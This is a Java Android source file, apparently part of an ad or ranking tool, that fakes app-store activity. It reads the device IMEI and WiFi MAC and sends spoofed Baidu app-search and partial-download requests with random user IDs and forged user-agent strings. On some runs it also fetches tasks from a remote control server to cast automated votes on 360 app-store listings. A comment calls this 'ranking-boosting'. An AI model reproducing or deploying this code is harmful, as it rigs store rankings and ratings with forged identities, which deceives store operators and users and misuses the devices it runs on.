package com.umeng.ad.app;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;

class MarketBido extends Market {

	private String scoreParms;

	public MarketBido() {
	}

	MarketBido(String packageName) {
		MARKET_NAME = MARKET_BIDO;
		setPackageName(packageName);
	}

	@Override
	protected boolean prepareToRank(Context context) throws Exception {
		boolean result = false;
		TelephonyManager mTelephonyMgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = u.generateImei(mTelephonyMgr.getDeviceId());
		String verName = Build.VERSION.CODENAME;
		String verCode = Build.VERSION.SDK_INT + "";
		String brand = Build.BRAND;
		String wifiMac = u.getWifiMac(context);
		String keyword = getAppKeyword();

		/**
		 *
		 */
		String[] ua = new String[5];
		ua[0] = "aps_480_800_android_2.2.7_a1";
		ua[1] = "aps_480_854_android_2.2.7_a1";
		ua[2] = "aps_480_854_android_2.2.7_a1";
		ua[3] = "aps_480_854_android_2.2.7_a1";
		ua[4] = "aps_480_854_android_2.2.7_a1";
		StringBuffer searchURL = new StringBuffer(
				"http://m.baidu.com/s?tn=native&native_api=1&platform_version_id=10&word="
						+ URLEncoder.encode(keyword, "UTF-8")
						+ "&st=10a001&pn=0&f=search");

		StringBuffer searchParams = new StringBuffer("st=10a001&");
		searchParams.append("pu=sz@1320_480&");
		searchParams.append("ext=appmobile&");
		searchParams
				.append("word=" + URLEncoder.encode(keyword, "UTF-8") + "&");
		searchParams.append("nopic=0&");
		searchParams.append("psize=2&");
		String uid = "aps_" + System.currentTimeMillis() + "_"
				+ u.generateRandCharNum(32);
		searchParams.append("uid=" + uid + "&");
		String uaS = ua[(int) Math.random() * ua.length];
		searchParams.append("ua=" + uaS + "&");
		String from = "1426l";
		searchParams.append("from=" + from + "&");
		String ut = URLEncoder.encode(brand + verName, "UTF-8");
		searchParams.append("ut=" + ut + "&");
		String ver = "16779274";
		searchParams.append("ver=" + ver + "&");
		searchParams.append("cno=4000000&");
		searchParams.append("platform_version_id=" + verCode
				+ "&gms=true&language=zh&");
		searchParams
				.append("country=CN&network=WF&operator=310004&apn=&firstdoc=");
		String agent = "Mozilla/5.0 (Linux; U; Android "
				+ verName
				+ "; zh-cn; "
				+ brand
				+ " Build/"
				+ u.generateRandCharNum(6)
				+ ") AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";

		// 输出刷排名的方式，关键字、或者分类浏览
		String rankType = params.get("rankType");
		MLog.i("keyword:" + appKeywords);
		MLog.i(" params:" + params);
		MLog.i(MARKET_NAME + PACKAGE_NAME + " rankType:" + rankType);

		JSONObject jsonObject = null;
		if ("category".equals(rankType)) {
			jsonObject = new JSONObject();
			jsonObject.put("data_tj", params.get("tj"));
			jsonObject.put("apk_url", params.get("apk_url"));
		} else {
			jsonObject = this.searchAPP(searchURL.toString(), u.getInstance().getAgent(0));
			MLog.i("$searchAPP result$" + jsonObject);
		}

		/**
		 * Get app action
		 */
		StringBuffer downPreParams = new StringBuffer("action=download&");
		downPreParams.append("ext=appmobile&");
		downPreParams.append("tj="
				+ URLEncoder.encode(jsonObject.getString("data_tj"), "UTF-8")
				+ "&");
		downPreParams.append("uid=" + uid + "&");
		downPreParams.append("ua=" + uaS + "&");
		downPreParams.append("from=" + from + "&");
		downPreParams.append("ut=" + ut + "&");
		downPreParams.append("ver=" + ver + "&");
		downPreParams.append("platform_version_id=" + verCode
				+ "&gms=true&language=zh&"
				+ "country=CN&network=WF&operator=310004&apn=&firstdoc=");
		this.getAppAction(downPreParams.toString());

		/**
		 * download apk
		 */
		String downloadURL = jsonObject.getString("apk_url");
		int range = (int) (Math.random() * 300);

		boolean downloadOk = this.download(downloadURL, range + "-"
				+ (range + 2), context);

		if (System.currentTimeMillis() % 5 == 0) {
			try {
				JSONObject object = autoVote360Pre(
						"http://umeng.sinaapp.com/enter.php/Admin/AutoVote360/auto360Score",
						agent);
				if (object != null) {
					String referer = "http://zhushou.360.cn/detail/index/soft_id/"
							+ object.getString("app_id")
							+ "?recrefer=SE_D_"
							+ URLEncoder.encode(object.getString("app_name"),
									"utf-8");
					boolean re = autoVote3602(object.getString("url"), referer,
							agent);
					if (re) {
						autoVote3603(
								"http://umeng.sinaapp.com/enter.php/Admin/AutoVote360/auto360ScoreAfter?package="
										+ object.getString("package")
										+ "&expect_count="
										+ object.getString("expect_count"),
								agent);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		return downloadOk;
	}

	private JSONObject autoVote360Pre(String url, String agent) {
		try {
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("User-Agent", agent);
			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpPost.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '" + agent + "' ");
			curlString.append(url);
			MLog.i("--autoVote360--\n" + url);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params, 20 * 1000);
			HttpConnectionParams.setSoTimeout(params, 20 * 1000);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("autoVote360=>status_code:" + code);

			String body = u.readContentFromHttpResponse(response, "utf-8");
			MLog.d("autoVote360 body:" + body);

			return new JSONObject(body);

		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private boolean autoVote3602(String url, String referer, String agent) {
		try {
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("User-Agent", agent);
			httpPost.addHeader("Referer", referer);
			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpPost.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '" + agent + "' ");
			curlString.append(url);
			MLog.i("--autoVote3602--\n" + url);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params, 20 * 1000);
			HttpConnectionParams.setSoTimeout(params, 20 * 1000);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("autoVote3602=>status_code:" + code);

			String body = u.readContentFromHttpResponse(response, "utf-8");
			MLog.d("autoVote3602 body:" + body);

			body = body.replace("try{poll.onSuccessVote(", "");
			body = body.replace(");}catch(e){}", "");
			JSONObject object = new JSONObject(body);
			if (object.getBoolean("data")) {
				return true;
			}
			return false;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	private boolean autoVote3603(String url, String agent) {
		try {
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("User-Agent", agent);
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpPost.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '" + agent + "' ");
			curlString.append(url);
			MLog.i("--autoVote3603--\n" + url);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params, 20 * 1000);
			HttpConnectionParams.setSoTimeout(params, 20 * 1000);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("autoVote3603=>status_code:" + code);

			String body = u.readContentFromHttpResponse(response, "utf-8");
			MLog.d("autoVote3603 body:" + body);

			return false;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}


	private JSONObject searchAPP(String url, String agent) {
		try {
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("User-Agent", agent);
			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpPost.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '" + agent + "' ");
			curlString.append(url);
			MLog.i("--searchAPP--\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params, 20 * 1000);
			HttpConnectionParams.setSoTimeout(params, 20 * 1000);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("searchAPP=>status_code:" + code);

			
			String body = u.readContentFromHttpResponse(response, "utf-8");
			MLog.d("searchApp body:" + body);
			JSONObject o = new JSONObject();
			JSONObject jsonObject = new JSONObject(body);
			JSONArray array = jsonObject.getJSONObject("result").getJSONArray(
					"data");
			for (int i = 0; i < array.length(); i++) {
				JSONObject object = array.getJSONObject(i);
				if (PACKAGE_NAME.equals(object.getString("package"))) {
					o.put("pkg_name", PACKAGE_NAME);
					o.put("apk_url", object.getString("download_inner"));
					o.put("data_tj", object.getString("tj"));
					o.put("detail_url", "");
					break;
				}

			}
			return o;
		
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	// private void makeScore(String agent) {
	// try {
	// String url = "http://m.baidu.com/app?action=score&type=s&"
	// + scoreParms;
	// HttpGet httpPost = new HttpGet(url);
	// /**
	// * Logger.i(this,curlString);
	// */
	// StringBuffer curlString = new StringBuffer("curl ");
	// Header[] headers = httpPost.getAllHeaders();
	// for (Header header : headers) {
	// curlString.append("-H '" + header.getName() + ": "
	// + header.getValue() + "' ");
	// }
	// curlString.append("-A '" + agent + "' ");
	// curlString.append(url);
	// MLog.i("--MakeScore--\n" + curlString);
	//
	// /**
	// * HttpClient
	// */
	// DefaultHttpClient client = new DefaultHttpClient();
	// HttpParams params = new BasicHttpParams();
	//
	// HttpConnectionParams.setConnectionTimeout(params, 20 * 1000);
	// HttpConnectionParams.setSoTimeout(params, 20 * 1000);
	// HttpConnectionParams.setSocketBufferSize(params, 8192);
	// HttpClientParams.setRedirecting(params, true);
	// HttpProtocolParams.setUserAgent(params, agent);
	// client.setParams(params);
	// /**
	// * Execute post
	// */
	// HttpResponse response = client.execute(httpPost);
	//
	// int code = response.getStatusLine().getStatusCode();
	// MLog.i("makeScore=>status_code:" + code);
	//
	// InputStream inputstream = response.getEntity().getContent();
	// InputStreamReader inputstreamreader = new InputStreamReader(
	// inputstream, "UTF-8");
	// BufferedReader bufferedreader = new BufferedReader(
	// inputstreamreader);
	//
	// StringBuffer lines = new StringBuffer();
	// String line = "";
	// while ((line = bufferedreader.readLine()) != null) {
	// lines.append(line);
	// }
	// MLog.i("MakeScoreResult:" + lines);
	// } catch (Exception e) {
	// e.printStackTrace();
	// }
	// }

	/**
	 * 
	 */
	private boolean download(String url, String range, Context context) {
		try {
			/**
			 * data
			 */

			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Range", "bytes=" + range);
			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '' ");
			curlString.append(url);
			MLog.i("--download--\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params, 20 * 1000);
			HttpConnectionParams.setSoTimeout(params, 20 * 1000);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("download=>status_code:" + code);
			if (code == HttpStatus.SC_PARTIAL_CONTENT) {
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return false;
	}

	/**
	 * 
	 */
	private void getAppAction(String httpParams) {
		try {
			/**
			 * data
			 */
			String url = "http://m.baidu.com/app?";
			url += httpParams;

			HttpGet httpGet = new HttpGet(url);

			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '' ");
			curlString.append(url);
			MLog.i("--getAppAction--\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params, 20 * 1000);
			HttpConnectionParams.setSoTimeout(params, 20 * 1000);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("getAppAction=>status_code:" + code);
			InputStream inputstream = response.getEntity().getContent();
			InputStreamReader inputstreamreader = new InputStreamReader(
					inputstream);
			BufferedReader bufferedreader = new BufferedReader(
					inputstreamreader);

			StringBuffer lines = new StringBuffer();
			String line = "";
			while ((line = bufferedreader.readLine()) != null) {
				MLog.i("getAppAction:" + line);
				lines.append(line);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * @return the scoreParms
	 */
	public String getScoreParms() {
		return scoreParms;
	}

	/**
	 * @param scoreParms
	 *            the scoreParms to set
	 */
	public void setScoreParms(String scoreParms) {
		this.scoreParms = scoreParms;
	}

	@Override
	protected void initAllParams() {
		try {
			setScoreParms(params.get("a_scoreParams"));
		} catch (Exception e) {
		}
	}
}
